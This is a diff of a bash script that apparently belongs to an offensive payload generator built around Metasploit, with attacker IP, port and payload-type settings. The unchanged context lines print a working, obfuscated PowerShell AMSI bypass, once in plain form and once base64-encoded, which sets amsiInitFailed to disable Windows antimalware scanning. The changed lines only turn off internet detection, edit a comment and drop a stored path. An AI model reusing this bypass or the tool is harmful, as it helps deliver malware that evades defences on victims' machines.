@@ -8,7 +8,7 @@ COWSAYFILESOURCE=/usr/games/cowsay #you can change this as you want
 #real code for base64 below : (([Ref].Assembly.gettypes() | ? {$_.Name -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBAsE64String('QQBt'+'AHMAaQA'+'qAHQAaQB'+'sAHMA')))}).GetFields($([Text.Encoding]::Unicode.GetString([Convert]::FromBAsE64String('T'+'gB'+'vAG4AUAB1AGIAb'+'ABpAGMALABTAHQAYQB0A'+'GkAYwA=')))) | ? {$_.Name -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBAsE64String('Y'+'QBtAHMA'+'aQBJAG4Aa'+'QB0ACoAYQB'+'pAGwAZQ'+'BkAA==')))}).SetValue($null,$true)
 AMSIBYPASSCODEINBASE64="KAAoAFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAGcAZQB0AHQAeQBwAGUAcwAoACkAIAB8ACAAPwAgAHsAJABfAC4ATgBhAG0AZQAgAC0AbABpAGsAZQAgACQAKABbAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBuAGkAYwBvAGQAZQAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBBAHMARQA2ADQAUwB0AHIAaQBuAGcAKAAnAFEAUQBCAHQAJwArACcAQQBIAE0AQQBhAFEAQQAnACsAJwBxAEEASABRAEEAYQBRAEIAJwArACcAcwBBAEgATQBBACcAKQApACkAfQApAC4ARwBlAHQARgBpAGUAbABkAHMAKAAkACgAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAbgBpAGMAbwBkAGUALgBHAGUAdABTAHQAcgBpAG4AZwAoAFsAQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAQQBzAEUANgA0AFMAdAByAGkAbgBnACgAJwBUACcAKwAnAGcAQgAnACsAJwB2AEEARwA0AEEAVQBBAEIAMQBBAEcASQBBAGIAJwArACcAQQBCAHAAQQBHAE0AQQBMAEEAQgBUAEEASABRAEEAWQBRAEIAMABBACcAKwAnAEcAawBBAFkAdwBBAD0AJwApACkAKQApACAAfAAgAD8AIAB7ACQAXwAuAE4AYQBtAGUAIAAtAGwAaQBrAGUAIAAkACgAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAbgBpAGMAbwBkAGUALgBHAGUAdABTAHQAcgBpAG4AZwAoAFsAQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAQQBzAEUANgA0AFMAdAByAGkAbgBnACgAJwBZACcAKwAnAFEAQgB0AEEASABNAEEAJwArACcAYQBRAEIASgBBAEcANABBAGEAJwArACcAUQBCADAAQQBDAG8AQQBZAFEAQgAnACsAJwBwAEEARwB3AEEAWgBRACcAKwAnAEIAawBBAEEAPQA9ACcAKQApACkAfQApAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkACgA=" #this is the default one....please dont change
 ATTACKERARCH=`dpkg --print-architecture` #goddamn it please dont fucking change it
-DETECTINTERNETCONNECTION=yes #not recommended to change it but you can change it to "no"
+DETECTINTERNETCONNECTION=no #not recommended to change it but you can change it to "no"
 DETECTATTACKERLINUXDISTRIBUTION=yes #not recommended to change it but you can change it to "no"
 ENABLEROOTDETECTOR=yes #not recommended to change it but you can change it to "no"
 SESSIONID=$RANDOM #goddamn it please dont fucking change it
@@ -593,7 +593,7 @@ while true; do
         echo -e $red "[!!!WARNING!!!] Wrong Input !!! [!!!WARNING!!!]"
     fi
 done
-#removing last session values directory
+#removing last session values directory after being used
 rm .sessionvalues* -rf
 #adds a hidden directory containing session values
 mkdir .sessionvalues$SESSIONID
@@ -601,7 +601,6 @@ mkdir .sessionvalues$SESSIONID
 if [ $custompayload = no ]; then
     echo "$SESSIONID" &>> .sessionvalues$SESSIONID/sessionid.txt
     echo "defaultpayload" &>> .sessionvalues$SESSIONID/sessiontype.txt
-    echo "$msfpath" &>> .sessionvalues$SESSIONID/msfpath.txt
     echo "$msfpaytype" &>> .sessionvalues$SESSIONID/msfpaytype.txt
     echo "$yourip" &>> .sessionvalues$SESSIONID/lhost.txt 
     echo "$yourport" &>> .sessionvalues$SESSIONID/lport.txt
